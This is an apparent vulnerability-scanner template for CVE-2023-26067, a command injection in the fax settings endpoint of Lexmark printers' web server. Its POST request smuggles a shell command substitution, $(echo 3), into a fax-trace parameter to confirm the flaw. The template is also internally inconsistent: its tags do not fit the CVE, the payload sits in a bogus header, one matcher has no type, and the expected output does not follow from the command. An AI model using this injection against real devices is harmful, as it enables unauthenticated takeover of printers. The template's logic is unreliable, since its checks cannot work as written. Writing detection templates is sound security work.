
id: CVE-2023-26067

info:
  name:  Lexmark EWS RCE
  author: RosePwns
  severity: high
  description: |
    An unauthenticated remote code execution vulnerability exists in the embedded webserver in certain Lexmark devices through 2023-02-19. The vulnerability is only exposed if, when setting up the printer or device, the user selects "Set up Later" when asked if they would like to add an Admin user. If no Admin user is created, the endpoint /cgi-bin/fax_change_faxtrace_settings is accessible without authentication. The endpoint allows the user to configure a number of different fax settings. A number of the configurable parameters on the page fail to be sanitized properly before being used in a bash eval statement, allowing for an unauthenticated user to run arbitrary commands.
  impact: |
    Allows unauthenticated users to run arbitrary commands. 
  remediation: Update firmware
  reference:
    - https://publications.lexmark.com/publications/security-alerts/CVE-2023-26067.pdf
    - https://nvd.nist.gov/vuln/detail/CVE-2023-26067
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2023-26067
    cwe-id: CWE-269
  metadata:
    verified: false
    Affected: Certain Lexmark devices through 2023-02-19.
  tags: apache,cve,proxy,http,smuggling

http:
  - raw:
      - |
        GET /cgi-bin/fax_change_faxtrace_settings HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /cgi-bin/fax_change_faxtrace_settings HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
        Data: FT_Custom_lbtrace=$(echo 3)
    matchers-condition: and
    matchers:
      - type:
        words:
          - "FT_Custom_lbtrace=High"
        part: body
      - type: status
        status:
          - 200
